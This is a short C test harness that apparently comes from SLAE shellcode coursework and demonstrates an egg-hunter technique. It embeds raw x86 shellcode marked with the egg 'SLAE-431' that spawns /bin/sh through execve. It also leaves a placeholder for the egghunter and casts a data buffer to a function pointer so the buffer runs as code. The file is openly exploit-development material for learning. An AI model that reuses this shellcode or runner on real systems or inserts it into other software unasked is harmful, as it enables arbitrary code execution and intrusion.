#include <stdio.h>
#include <string.h>

unsigned char egghunter[] = \
// enter egghunter here
"";

unsigned char rubbish1[] = "They said I probably shouldn't be a surgeon.";

unsigned char code[] = \
"SLAE-431"
"\x31\xc0\x31\xc9\x99\x50\x68\x6e\x2f\x73"
"\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b"
"\xcd\x80";

unsigned char restofmem[] = "I am bender please insert girder";

void main()
{
	printf("Rifle: [%d]\n", strlen(egghunter));
	printf("Code: [%d]\n", strlen(code));

	int (*ret)() = (int(*)())egghunter;

	ret();
}
